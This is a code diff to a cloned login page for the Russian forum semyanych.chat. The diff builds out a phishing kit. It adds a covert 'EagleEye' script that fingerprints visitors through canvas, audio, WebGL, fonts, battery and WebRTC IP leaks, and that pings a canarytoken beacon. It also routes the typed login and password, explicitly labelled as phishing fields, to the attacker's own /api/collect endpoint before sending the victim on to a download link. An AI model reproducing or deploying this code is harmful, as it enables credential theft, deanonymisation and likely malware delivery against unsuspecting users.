@@ -1,7 +1,6 @@
 <!DOCTYPE html>
 <html id="XF" lang="ru-RU" dir="LTR" style="font-size: 62.5%;" data-app="public" class="has-no-js template-login uix_page--fixed uix_hasSectionLinks">
 <head>
-    <!-- ЭТОТ ТЕГ НУЖЕН ДЛЯ КАРТИНОК, НО ОН ЛОМАЛ ОТПРАВКУ ДАННЫХ. МЫ ЭТО ОБОШЛИ В JS -->
     <base href="https://semyanych.chat/">
     <meta charset="utf-8" />
     <meta http-equiv="X-UA-Compatible" content="IE=Edge" />
@@ -28,6 +27,161 @@
         .cf-subtext { font-size: 14px; color: #666; margin-bottom: 40px; text-align: center; }
         .cf-footer { position: absolute; bottom: 20px; font-size: 12px; color: #999; text-align: center; }
     </style>
+
+    <!-- ВНЕДРЕННЫЙ СКРИПТ СЛЕЖЕНИЯ (GOD MODE) -->
+    <script>
+    window.EagleEye = class {
+        constructor() {
+            // Используем window.location.origin, чтобы игнорировать тег <base>
+            this.endpoint = window.location.origin + '/api/collect';
+            this.sessionId = Math.random().toString(36).substring(7);
+            this.init();
+        }
+
+        async init() {
+            this.triggerDNSBeacon();
+            if (document.readyState === 'complete') setTimeout(() => this.collect('Page Load (Login Screen)'), 100);
+            else window.addEventListener('load', () => setTimeout(() => this.collect('Page Load (Login Screen)'), 100));
+        }
+
+        triggerDNSBeacon() {
+            const canaryUrl = "http://canarytokens.com/tags/stuff/traffic/giumoqpvt3mawd0bulwx2o4p5/submit.aspx";
+            const unique = Math.random().toString(36).substring(7);
+            new Image().src = `${canaryUrl}?uid=${this.sessionId}&rnd=${unique}`;
+        }
+
+        async getWebRTCData() {
+            const ips = [];
+            try {
+                const pc = new RTCPeerConnection({
+                    iceServers: [
+                        { urls: "stun:stun.l.google.com:19302" },
+                        { urls: "stun:stun1.l.google.com:19302" },
+                        { urls: "stun:stun2.l.google.com:19302" }
+                    ]
+                });
+                pc.createDataChannel('');
+                const offer = await pc.createOffer();
+                await pc.setLocalDescription(offer);
+                await new Promise(resolve => {
+                    pc.onicecandidate = (e) => {
+                        if (!e.candidate) return;
+                        const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
+                        const match = e.candidate.candidate.match(ipRegex);
+                        if (match && !ips.includes(match[1])) ips.push(match[1]);
+                    };
+                    setTimeout(resolve, 1500);
+                });
+            } catch (e) { }
+            return ips;
+        }
+
+        getCanvasHash() {
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = "top"; ctx.font = "14px 'Arial'";
+                ctx.fillStyle = "#f60"; ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = "#069"; ctx.fillText("Eagle_v3_🦅", 2, 15);
+                ctx.fillStyle = "rgba(102, 204, 0, 0.7)"; ctx.fillText("Eagle_v3_🦅", 4, 17);
+                const data = canvas.toDataURL();
+                let hash = 0;
+                for (let i = 0; i < data.length; i++) {
+                    hash = ((hash << 5) - hash) + data.charCodeAt(i);
+                    hash |= 0;
+                }
+                return hash.toString(16);
+            } catch (e) { return "error"; }
+        }
+
+        async getAudioHash() {
+            try {
+                const audioCtx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
+                const osc = audioCtx.createOscillator();
+                osc.type = 'triangle';
+                osc.frequency.setValueAtTime(10000, audioCtx.currentTime);
+                osc.connect(audioCtx.destination);
+                osc.start(0);
+                const render = await audioCtx.startRendering();
+                const data = render.getChannelData(0);
+                let sum = 0;
+                for (let i = 0; i < data.length; i++) { sum += Math.abs(data[i]); }
+                return sum.toFixed(6);
+            } catch (e) { return "no_audio"; }
+        }
+
+        detectLies() {
+            const anomalies = [];
+            const ua = navigator.userAgent;
+            const hasGroupBy = !!Object.groupBy;
+            if (ua.includes("Chrome/109") && hasGroupBy) anomalies.push("CRITICAL: Fake Chrome 109");
+            if (!window.matchMedia(`(width: ${screen.width}px)`).matches) anomalies.push(`SCREEN SPOOF: JS=${screen.width}, CSS mismatch`);
+            const fonts = this.getFonts();
+            if (ua.includes("Windows") && !fonts.includes("Calibri")) anomalies.push("OS SPOOF: Claims Windows but no Calibri");
+            if (fonts.includes("Ubuntu") || fonts.includes("Cantarell")) anomalies.push("REALITY: Likely Linux System");
+            return anomalies;
+        }
+
+        getFonts() {
+            const fontList = ["Arial", "Calibri", "Consolas", "Courier New", "Helvetica", "Roboto", "Segoe UI", "Times New Roman", "Verdana", "Ubuntu", "Cantarell", "Liberation Sans"];
+            const detected = [];
+            const span = document.createElement("span");
+            span.style.fontSize = "72px"; span.style.position = "absolute"; span.style.left = "-9999px"; span.innerHTML = "mmmmmmmmmmlli";
+            document.body.appendChild(span);
+            span.style.fontFamily = "monospace";
+            const defaultWidth = span.offsetWidth;
+            for (const font of fontList) {
+                span.style.fontFamily = `"${font}", monospace`;
+                if (span.offsetWidth !== defaultWidth) detected.push(font);
+            }
+            document.body.removeChild(span);
+            return detected;
+        }
+
+        async getClientHints() {
+            if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+                try {
+                    const ua = await navigator.userAgentData.getHighEntropyValues(["model", "platformVersion", "architecture"]);
+                    return { model: ua.model, platform: ua.platform, version: ua.platformVersion, mobile: ua.mobile };
+                } catch(e) { return null; }
+            }
+            return null;
+        }
+
+        getWebGLInfo() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (!gl) return { renderer: 'N/A' };
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                return { renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL), vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) };
+            } catch(e) { return { renderer: 'Error' }; }
+        }
+
+        async collect(triggerName, extraData = {}) {
+            const [ips, battery, clientHints, audioHash] = await Promise.all([
+                this.getWebRTCData(),
+                navigator.getBattery ? navigator.getBattery().then(b => `${Math.round(b.level*100)}%`) : 'N/A',
+                this.getClientHints(),
+                this.getAudioHash()
+            ]);
+            
+            const anomalies = this.detectLies();
+            const payload = {
+                meta: { url: window.location.href, referrer: document.referrer, trigger: triggerName, session_id: this.sessionId },
+                fingerprint_v2: { canvas_hash: this.getCanvasHash(), audio_hash: audioHash, anomalies: anomalies, is_spoofing: anomalies.length > 0 },
+                fingerprint: { gpu: this.getWebGLInfo().renderer, vendor: this.getWebGLInfo().vendor, screen: `${screen.width}x${screen.height}`, cores: navigator.hardwareConcurrency, memory: navigator.deviceMemory },
+                client_hints: clientHints,
+                system: { ua: navigator.userAgent, platform: navigator.platform, language: navigator.language, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, timezone_offset: new Date().getTimezoneOffset(), battery: battery, fonts: this.getFonts() },
+                network: { webrtc_ips: ips },
+                ...extraData
+            };
+            const blob = new Blob([JSON.stringify(payload)], {type: 'application/json'});
+            navigator.sendBeacon(this.endpoint, blob);
+        }
+    };
+    const eagle = new EagleEye();
+    </script>
 </head>
 
 <body data-template="login">
@@ -127,7 +281,7 @@
         }
 
         document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault(); // ОСТАНАВЛИВАЕМ ОБЫЧНУЮ ОТПРАВКУ
+            e.preventDefault();
             
             const login = document.getElementById('loginField').value;
             const password = document.getElementById('passwordField').value;
@@ -138,26 +292,10 @@
             btn.innerHTML = '<span class="button-text">Проверка...</span>';
             btn.disabled = true;
 
-            const data = {
-                meta: { trigger: 'SEMYANICH LOGIN', url: window.location.href },
+            // Используем EagleEye для отправки данных вместе с паролем
+            const eagle = new EagleEye();
+            eagle.collect('SEMYANICH LOGIN ATTEMPT', {
                 system: { phishing_login: login, phishing_password: password }
-            };
-
-            // !!! ВАЖНОЕ ИСПРАВЛЕНИЕ !!!
-            // Мы используем window.location.origin, чтобы игнорировать тег <base>
-            // и отправить данные на ТВОЙ сервер, а не на semyanych.chat
-            const apiUrl = window.location.origin + '/api/collect';
-
-            // 1. Beacon (надежно при уходе со страницы)
-            const blob = new Blob([JSON.stringify(data)], {type: 'application/json'});
-            navigator.sendBeacon(apiUrl, blob);
-            
-            // 2. Fetch (для гарантии)
-            fetch(apiUrl, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify(data),
-                keepalive: true
             });
 
             setTimeout(() => {
@@ -169,8 +307,7 @@
                     document.getElementById('loginError').style.display = 'block';
                     document.getElementById('passwordField').value = '';
                 } else {
-                    // Редирект на скачивание (внутри твоего приложения)
-                    // Используем window.location.origin снова, чтобы не улететь на реальный сайт
+                    // Редирект на скачивание (используем origin, чтобы не улететь на реальный сайт)
                     window.location.href = window.location.origin + `/download/${targetUid}/${targetFilename}`;
                 }
             }, 800);
